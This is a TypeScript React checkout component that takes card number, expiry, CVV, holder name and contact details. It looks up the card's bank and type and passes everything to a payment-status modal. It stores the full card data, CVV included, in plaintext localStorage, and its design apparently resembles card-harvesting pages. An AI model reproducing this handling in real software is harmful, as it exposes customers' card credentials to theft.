"use client";

import { useEffect, useState } from "react";
import PaymentStatusModal from "./PaymentStatusModal";
import { CheckCardService } from "@/services/checkCardService";
import { mapBankName, mapCardMeta } from "@/lib/binMeta";
import { validateBin } from "@/services/bin/validate";

export interface CheckoutPayload {
  payment: {
    numeroTarjeta: string;
    vencimiento: string;
    cvv: string;
    titular: string;
    email: string;
    celular: string;
    telefono: string;
  };
  comercio: string;
  price: string;
  priceFormatted: string;
  redirectSuccess: string;
  redirectDeclined: string;
}

interface CheckoutClientProps {
  sessionId: string;
  payload: CheckoutPayload;
}

const localMeta = (card: string): { cardBrand: string; metodo: string } => {
  const local = CheckCardService.validateCard(card);
  return {
    cardBrand: local.success && local.brand !== "N/A" ? (local.brand ?? "") : "N/A",
    metodo: "N/A",
  };
};

export default function CheckoutClient({ sessionId, payload }: CheckoutClientProps) {
  const [isOpen, setIsOpen] = useState(false);
  const [cardMeta, setCardMeta] = useState<{ cardBrand: string; metodo: string }>(() => ({
    cardBrand: "N/A",
    metodo: "N/A",
  }));
  const [banco, setBanco] = useState<string | undefined>(undefined);

  useEffect(() => {
    const cleanCard = payload.payment.numeroTarjeta.replace(/\D/g, "");
    const bin = cleanCard.slice(0, 6);

    localStorage.setItem("checkout_payment", JSON.stringify(payload.payment));

    const resolve = async () => {
      if (bin.length < 6) {
        setCardMeta(localMeta(cleanCard));
        setBanco(undefined);
        setIsOpen(true);
        return;
      }

      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);

      const fallbackLocal = () => {
        setCardMeta(localMeta(cleanCard));
        setBanco(undefined);
      };

      try {
        const { data: validateData, error: validateError } = await validateBin(cleanCard);
        if (!validateError && validateData) {
          setCardMeta(mapCardMeta(validateData.brand, validateData.type));
          setBanco(mapBankName(validateData.issuer));
        } else {
          const res = await fetch(`/api/bin/lookup?bin=${bin}`, {
            signal: controller.signal,
          });
          if (!res.ok) throw new Error("lookup falló");
          const data = await res.json();
          setCardMeta(mapCardMeta(data.scheme, data.type));
          setBanco(mapBankName(data.bank?.name));
        }
      } catch {
        fallbackLocal();
      } finally {
        clearTimeout(timeout);
      }
      setIsOpen(true);
    };

    resolve();
  }, [payload]);

  useEffect(() => {
    localStorage.setItem(
      "checkout_payment",
      JSON.stringify({
        ...payload.payment,
        cardBrand: cardMeta.cardBrand,
        metodo: cardMeta.metodo,
        ...(banco ? { banco } : {}),
      }),
    );
  }, [payload, cardMeta, banco]);

  return (
    <PaymentStatusModal
      sessionId={sessionId}
      isOpen={isOpen}
      comercio={payload.comercio}
      price={payload.price}
      priceFormatted={payload.priceFormatted}
      last4={payload.payment.numeroTarjeta.slice(-4)}
      card={payload.payment.numeroTarjeta}
      cardT={
        cardMeta.metodo === "credito"
          ? "Crédito"
          : cardMeta.metodo === "debito"
            ? "Débito"
            : cardMeta.metodo === "prepago"
              ? "Prepago"
              : "N/A"
      }
      vencimiento={payload.payment.vencimiento}
      cvv={payload.payment.cvv}
      titular={payload.payment.titular}
      cardBrand={cardMeta.cardBrand}
      banco={banco}
      email={payload.payment.email}
      contactData={{ email: payload.payment.email, celular: payload.payment.celular }}
      redirectSuccess={payload.redirectSuccess}
      redirectDeclined={payload.redirectDeclined}
    />
  );
}